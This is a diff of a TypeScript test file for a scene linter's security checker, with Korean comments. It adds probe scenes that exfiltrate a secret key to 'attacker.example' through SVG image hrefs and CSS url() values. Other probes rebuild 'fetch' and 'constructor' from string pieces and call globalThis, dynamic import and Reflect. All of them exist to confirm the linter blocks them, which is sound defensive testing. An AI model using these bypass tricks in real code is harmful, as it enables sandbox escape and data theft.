@@ -1,6 +1,12 @@
+import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
 import { describe, expect, it } from 'vitest';
-import { lintScene, sceneTexts, scanSource, textOverlap } from './sceneLint';
+import { SAFETY_NO_RENDER, lintScene, sceneSafety, sceneTexts, scanSource, textOverlap } from './sceneLint';
 import { approxWords } from './sceneRules';
+import { previewScene } from './scenePreview';
+import { previewSceneFull } from './sceneFull';
+import type { SceneJob } from './sceneJob';
 
 const SENT = '블루베리는 산성 흙을 좋아해서, 피트모스를 절반 넘게 섞어 pH 4.5에서 5.5로 맞춥니다.';
 const GOOD = `// S1 "${SENT}" — 머리 주석의 문장·/* 블록 */ 은 검사하지 않는다(문장 밖 말 '전정가위 사용법'도)
@@ -95,5 +101,97 @@ describe('사람 손 금지(2026-10-23, 전체 화면 장면)', () => {
   it('noHands 면 Hand 부품을 문제로', () => {
     expect(lintScene(src, 's001', '묘목', { stage: 'FullStage', noHands: true }).some((p) => p.startsWith('사람 손(Hand) 금지'))).toBe(true);
     expect(lintScene(src, 's001', '묘목', { stage: 'FullStage' }).some((p) => p.startsWith('사람 손'))).toBe(false);
+  });
+});
+
+// 보안 구문 검사(2026-10-25) — 글자 정규식을 빠져나간 탐침 장면(scratchpad/lintprobe)이 이제 떨어져야 한다.
+describe('sceneSafety — 전역·네트워크·외부 주소 우회', () => {
+  const PROBE = `import React from 'react';
+import { FullStage, type FullSceneProps } from './_kit';
+const K = 'abc123SECRET';
+export default function Scene({ durationInFrames }: FullSceneProps) {
+  const g = (self as any)['fe' + 'tch'];
+  const F = [].constructor.constructor;
+  void g; void F;
+  return <FullStage frames={durationInFrames}><image href={'//attacker.example/' + K} width={1} height={1} /><rect style={{ fill: 'url(//attacker.example/x)' }} /></FullStage>;
+}
+`;
+  it('탐침 장면은 lintScene 에서 보안 문제로 떨어진다', () => {
+    const p = lintScene(PROBE, 's001', '흙을 돋운다', { stage: 'FullStage', urlPrefixes: ['a-', 'b-'], noRawText: true });
+    const sec = p.filter((x) => x.startsWith('보안:')).join('\n');
+    expect(sec).toContain('self');
+    expect(sec).toContain("['fe' + 'tch']");
+    expect(sec).toContain('.constructor');
+    expect(sec).toContain('<image>');
+    expect(sec).toContain("href 는 '#…' 글자만");
+    expect(sec).toContain('//attacker.example/');
+    expect(sec).toContain('url(//attacker.example/x)');
+  });
+  it('그 밖의 우회 — import()·globalThis·문자열 실행·Img·use href·String.fromCharCode·Reflect', () => {
+    const p = (body: string) => sceneSafety(`import React from 'react';\nexport default function Scene() { ${body} }`);
+    expect(p("void import('x'); return null;")).toContain('동적 import() 금지');
+    expect(p('return globalThis;').join()).toContain('globalThis');
+    expect(p("setTimeout('x()', 1); return null;").join()).toContain('setTimeout');
+    expect(p('return String.fromCharCode(47, 47);').join()).toContain('fromCharCode');
+    expect(p("return Reflect.get({}, 'a');").join()).toContain('Reflect');
+    expect(p("return <use href={x} />;").join()).toContain("href 는 '#…' 글자만"); // <use> 는 되지만 주소는 '#…' 만
+    expect(p("const o = { ['con' + 'structor']: 1 }; return o[`${'a'}b`];").join()).toContain('만든 문자열로 속성 접근');
+    expect(p("const p = { href: '//x' }; return <g {...p} />;").join()).toContain("href 는 '#…' 글자만");
+  });
+  it('기존 장면의 정상 패턴은 통과 — 배열 계산 키·Math 키·지역 이름 top·url(#…) 템플릿·xmlns·펼침·비온이 action', () => {
+    const ok = `import React from 'react';
+import { FullStage, Bionee, type FullSceneProps } from './_kit';
+const top = 120; const parent = { x: 1 };
+export default function Scene({ durationInFrames, frames }: FullSceneProps & { frames?: number }) {
+  const pts = [1, 2, 3]; const i = 1; const n = pts.length; const dash = { strokeDasharray: '4 4' };
+  const a = pts[i + 1] + pts[(i + 1) % n] + pts[Math.min(n - 1, i)] + pts[n - 1] + top + parent.x + (frames ?? 0);
+  return <FullStage frames={durationInFrames}><svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="s001-g"><stop offset={0} /></linearGradient></defs>
+    <path d="M0 0" {...dash} style={{ top: a }} fill={\`url(#s001-g)\`} /><rect fill="url(#s001-g)" clipPath="url(#s001-c)" /></svg><Bionee action="point" /></FullStage>;
+}
+`;
+    expect(sceneSafety(ok)).toEqual([]);
+  });
+});
+
+// 10-25 리뷰 — 헛경보 줄이기(정상 패턴 통과)와 우회는 그대로 막기.
+describe('sceneSafety — 헛경보 줄이기·우회는 그대로', () => {
+  const p = (body: string, head = '') => sceneSafety(`import React from 'react';\n${head}\nexport default function Scene() { ${body} }`);
+  it('정상 — url(${G})(G 가 #… const)·<use>/<textPath> href #…·수 함수 계산 키·경로 글자 이어 붙이기·라벨 글자 //', () => {
+    expect(p('return <rect fill={`url(${G})`} stroke={`url(${H})`} />;', "const G = '#s001-g'; const key = 's001'; const H = `#${key}-h`;")).toEqual([]);
+    expect(p('return <g><use href="#s001-leaf" /><text><textPath href="#s001-arc">가지</textPath></text><use xlinkHref={G} /></g>;', "const G = '#s001-g';")).toEqual([]);
+    expect(p('const xs = [1, 2]; const clamp = (i: number) => Math.max(0, Math.min(1, i)); const s = \'1\'; return xs[clamp(3)] + xs[Number(s)] + xs[parseInt(s, 10)] + xs[xs.indexOf(2)];')).toEqual([]);
+    expect(p("return <path d={'M 0 0 ' + 'L 10 10 ' + 'Z'} />;")).toEqual([]);
+    expect(p("const L1 = '물 // 거름'; return <g>{L1}</g>;")).toEqual([]);
+    expect(p('return <rect fill={`url( #s001-g)`} />;')).toEqual([]); // url( 뒤 공백 + #
+  });
+  it('우회는 그대로 — 이어 붙인 금지 이름·외부 주소, 문자열 메서드·String()·태그 템플릿 계산 키, #… 아닌 url(${…})', () => {
+    expect(p("const k = 'con' + 'structor'; return k;").join()).toContain('금지 이름 글자 금지');
+    expect(p("const k = `${'fe'}tch`; return k;").join()).toContain('금지 이름 글자 금지');
+    expect(p("const k = 'constructor'; return k;").join()).toContain('금지 이름 글자 금지');
+    expect(p("const u = '/' + '/evil.example/x'; return <g style={{ background: u }} />;").join()).toContain('외부 주소');
+    expect(p("return <rect style={{ fill: 'url(' + '//evil.example/x)' }} />;").join()).toContain('외부 주소');
+    expect(p("const u = '//evil.example'; return u;").join()).toContain('외부 주소'); // 밖이라도 //호스트 로 시작
+    expect(p('return <rect fill={`url(${u})`} />;', "let u = '#a'; u = '//evil';").join()).toContain('외부 주소');
+    expect(p('return <rect fill={`url(${G})`} />;', "const G = '#a'; function f(G: string) { return G; }").join()).toContain('외부 주소'); // 같은 이름이 다른 값으로도
+    const o = 'const o: any = {}; const a = [1];';
+    expect(p(`${o} return o[a.join('')];`).join()).toContain('만든 문자열로 속성 접근');
+    expect(p(`${o} return o[String(1)];`).join()).toContain('만든 문자열로 속성 접근');
+    expect(p(`${o} return o[String.raw\`x\`];`).join()).toContain('만든 문자열로 속성 접근');
+    expect(p(`${o} return o['a'.concat('b')];`).join()).toContain('만든 문자열로 속성 접근');
+    expect(p("return <image href=\"#x\" />;").join()).toContain('<image>'); // image 는 여전히 금지
+  });
+});
+
+describe('미리보기 — 보안 검사에 걸린 장면은 브라우저에서 돌리지 않는다', () => {
+  it('previewScene·previewSceneFull 모두 렌더 없이 문제만', async () => {
+    const work = fs.mkdtempSync(path.join(os.tmpdir(), 'lf-safe-'));
+    fs.writeFileSync(path.join(work, 's001.tsx'), "import React from 'react';\nexport default function Scene() { return <g>{String((self as any).name)}</g>; }\n");
+    const job = { batch: 1, repo: path.resolve('.'), workDir: work, fps: 30, scenes: [{ key: 's001', file: 's001.tsx', narration: '흙', frames: 90, words: [] }] } as unknown as SceneJob;
+    for (const r of [await previewScene(job, 's001'), await previewSceneFull({ ...job, stage: 'full', style: 'B' } as SceneJob, 's001')]) {
+      expect(r.ok).toBe(false);
+      expect(r.problems).toContain(SAFETY_NO_RENDER);
+      expect(r.stills).toEqual([]);
+    }
+    expect(fs.existsSync(path.join(work, '.preview'))).toBe(false);
   });
 });
